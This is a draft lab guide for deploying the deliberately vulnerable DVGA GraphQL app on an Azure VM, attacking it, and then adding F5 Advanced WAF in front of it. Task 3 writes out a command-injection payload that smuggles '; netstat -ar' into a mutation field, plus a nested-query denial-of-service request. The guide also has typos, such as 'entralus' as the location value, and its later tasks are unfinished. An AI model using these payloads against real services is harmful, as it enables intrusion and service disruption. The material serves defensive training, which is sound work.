# apiProtectionLabDRAFT
# Protecting APIs in Azure  with F5#

Welcome to API protection Lab. This time you'll work with GraphQL APIs running in an ACI (Azure Container Instance)

# Pre-requisites
- An azure account
- F5 Advanced WAF BIG-IP Trial License

# GOAL: 

Protect vulnerable GraphQL endpoint running in an Azure VM with F5 Advanced WAF

# Activities: #

1. Create Azure infrastructure using Azure loudshell
2. Deploy GraphQL App - DVGA
3. Attack it
4. Deploy F5 Adv WAF from F5 github repo
5. Attack again an see how F5 protects the app

# Task 1 -  Create Azure resources using Azure CLI

1. Go to you Azure Portal and click on the shell icon
2. Make sure Bash is selected (default)
3. Validate what locations are available to your subscription by issuing:
```

az account list-locations --output  table


```
See Name column and select the location  that makes more sense to  you. In this example we'll take 'centralus'

4. Define shell variables for further use with your location and Reource Group Name. In this example we use: centralus & hhRG:

```

location=entralus
rg=hhRGLab
vm=graphqlVM


```

** Be careful with spacing
** vm var is for later use

5. Create a resource group:

```

az group create -l $location -n $rg

```

You'll get somehitng like this:

```


  "id": "/subscriptions/<SOME NUMBER>/resourceGroups/hhRGlab",
  "location": "centralus",
  "managedBy": null,
  "name": "hhRGlab",
  "properties": {
    "provisioningState": "Succeeded"
  },
  "tags": null,
  "type": "Microsoft.Resources/resourceGroups"
}


```

# Task 2 -  Create GraphQL application on a linux VM

1. Create  a  linux virtual machine (VM) with the following command (in the Tag value put your initials after = symbol) :

```

az vm create -g $rg -n $vm --image "UbuntuLTS" --admin-username "azureuser" --generate-ssh-keys --tags owner[=<YOUR INITIALS>]

```

Output should be similiar to this one:


```

SSH key files '/home/h_heredia/.ssh/id_rsa' and '/home/h_heredia/.ssh/id_rsa.pub' have been generated under ~/.ssh to allow SSH access to the VM.If using machines without permanent storage, back up your keys to a safe location.
It is recommended to use parameter "--public-ip-sku Standard" to create new VM with Standard public IP. Please note that the default public IP used for VM creation will be changed from Basic to Standard in the future.
{
  "fqdns": "",
  "id": "/subscriptions/<some cool number>/resourceGroups/hhRGlab/providers/Microsoft.Compute/virtualMachines/graphqlVM",
  "location": "centralus",
  "macAddress": "<OUI>-45-B1-FB",
  "powerState": "VM running",
  "privateIpAddress": "10.0.0.4",
  "publicIpAddress": "<Public IP aasigned by azure>",
  "resourceGroup": "hhRGlab",
  "zones": ""
}

**note the RSA message. your ssh files are store on your Cloudshell portal home directory for later use.

```
Take note of the Public IP Address

2. Open port 22

```
az vm open-port -g $rg -n $vm --port 22


```
3. Connect to your VM using your ssh key file located at $HOME/.ssh

```

ssh -i id_rsa azureuser@<YOUR VM PUBLIC IP>



```
4. Once inside proceed to install graphQL app:

```
 sudo apt-get update 
 sudo  apt-get install -y docker.io 
 sudo  docker pull dolevf/dvga 
 sudo docker run -t -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga 
 sudo docker ps

```
 
5. Docker ps command should show container runningn on port 5000:

```

CONTAINER ID   IMAGE         COMMAND            CREATED      STATUS      PORTS                                       NAMES
f556d183fb23   dolevf/dvga   "python3 app.py"   5 days ago   Up 5 days   0.0.0.0:5000->5000/tcp, :::5000->5000/tcp   elated_antonelli

```




5. Get back to Azure Cloud shell (exit ssh connection) and Open VM ports for graphQL application (running on port tcp 5000):

```
az vm open-port -g $rg -n $vm --port 5000


```

Output's a bit large:

```

az vm open-port -g $rg -n $vm --port 5000
{
  "defaultSecurityRules": [
    {
      "access": "Allow",
      "description": "Allow inbound traffic from all VMs in VNET",
      "destinationAddressPrefix": "VirtualNetwork",
      "destinationAddressPrefixes": [],
      "destinationApplicationSecurityGroups": null,
      "destinationPortRange": "*",
      "destinationPortRanges": [],
      "direction": "Inbound",
      "etag": "W/\"6f2b9f76-1388-4a81-86e8-e933e7dc7c0a\"",
      "id": "/subscriptions/75f86c46-9cbc-4f6c-85ea-195e3d3c8ac0/resourceGroups/hhRGlab/providers/Microsoft.Network/networkSecurityGroups/graphqlVMNSG/defaultSecurityRules/AllowVnetInBound",
      "name": "AllowVnetInBound",
      "priority": 65000,
      "protocol": "*",
      "provisioningState": "Succeeded",
      "resourceGroup": "hhRGlab",
      "sourceAddressPrefix": "VirtualNetwork",
      "sourceAddressPrefixes": [],
      "sourceApplicationSecurityGroups": null,
      "sourcePortRange": "*",
      "sourcePortRanges": [],
     
   
      "id": "/subscriptions/75f86c46-9cbc-4f6c-85ea-195e3d3c8ac0/resourceGroups/hhRGlab/providers/Microsoft.Network/networkSecurityGroups/graphqlVMNSG/defaultSecurityRules/DenyAllOutBound",
      "name": "DenyAllOutBound",
      "priority": 65500,
      "protocol": "*",
      "provisioningState": "Succeeded",
      "resourceGroup": "hhRGlab",
      "sourceAddressPrefix": "*",
      "sourceAddressPrefixes": [],
      "sourceApplicationSecurityGroups": null,
      "sourcePortRange": "*",
      "sourcePortRanges": [],
      "type": "Microsoft.Network/networkSecurityGroups/defaultSecurityRules"
    }

    ///////////////////

  TOO MUCH OUTPUT
 FOR YOU MY FRIEND
 
 //////////////
      "sourcePortRanges": [],
      "type": "Microsoft.Network/networkSecurityGroups/securityRules"
    }
  ],
  "subnets": null,
  "tags": {},
  "type": "Microsoft.Network/networkSecurityGroups"

  ```

  ** command modifies Network Security Group to allow inbound port 5000

6. Test application by :

```

curl http://<YOUR VM PUBLIC IP>:5000 | grep DVGA


```

You'll receive this:

```

 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7955  100  7955    0     0   149k      0 --:--:-- --:--:-- --:--:--  149k
            <a class="dropdown-item" href="/start_over" style="color:darkorange">Rollback DVGA</a>
        Damn Vulnerable GraphQL Application, or DVGA, is a vulnerable GraphQL implementation. DVGA allows learning how GraphQL can be exploited as well as defended in a safe environment.
      <p>If you are interacting with DVGA programmatically, you can set a specific game mode (such as Beginner, or Expert) by passing the HTTP Request Header <code>X-DVGA-MODE</code> with either <code>Beginner</code> or <code>Expert</code> as values.</p>
      <p>If the Header is not set, DVGA will default to <u>Easy mode</u>.</p>
        DVGA's Beginner level is literally the default GraphQL implementation without any restrictions, security controls, or other protections. This is what you would get out of the box in most of the GraphQL implementations without hardening, with the addition of other custom vulnerabilities.
      <p>DVGA's Hard level is a hardened GraphQL implementation which contains a few security controls against malicious queries, such as Cost Based Analysis, Query Depth, Field De-dup checks, etc.</p>

      
```
Please note you tested directly using a GET to http://<YOUR VM PUBLIC IP> 

```
TRIVIA: what methods are allowed   on graphQL? and How many endpoints are used for graphQL operations?
```

Also use a browser with the same URL and navigate freely on the interface :)
- Naviagate Private Pastes, Import paste and other left-located tabs

## timestamp 2021112900

5. Now you can start attacking this app :)


  # Task 3 -  Do some attacks

#### Command Execution

1. Get the IP address of your recently created instance and change the hostname of the next curl request:

```


curl -g \
-X POST \
-H "Content-Type: application/json" \
-d '{"query":"mutation {importPaste(host:\"localhost\", port:80, path:\"/ ; netstat -ar\", scheme:\"http\"){result}}"}' \
http://<VM Public IP>:5000/graphql

```
PLEASE DO NOT FORGET PORT 5000

You should get someting like this:

```
"data":{"importPaste":{"result":"Kernel IP routing table\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\ndefault         X.X.X.X     0.0.0.0         UG        0 0          0 NIC\nX.X.X.X     *               255.255.255.0   U         0 0          0 NIC\n"}}}
```

As you can see, your GraphQL endpoint works and also allows anyone to know internal networking. Not cool.

#### Deep Recursion - DoS
2. 


```

curl -g \
-X POST \
-H "Content-Type: application/json" \
-d '{"query":"query {pastes {owner {paste {edges {node {owner {paste {edges {node {owner {paste {edges {node {owner {id}}}}}}}}}}}}}}}"}' \
http://<VM Public IP>:5000/graphql

  
  

```

Note the time it takes to answer this single request. This may lead to DoS increasing the number of requests.
  # Task 4 - Deploy F5 Adv WAF to protect GraphQL endpoint

  1. create an instance of Advanced WAF.

  ```

  az vm create -g $rg -n $vm --image "f5-big-ip-advanced-waf" --admin-username "azureuser" --generate-ssh-keys --tags owner[=<YOUR INITIALS>]


```
  # Task 5 - Try attacks again and see f5 event log
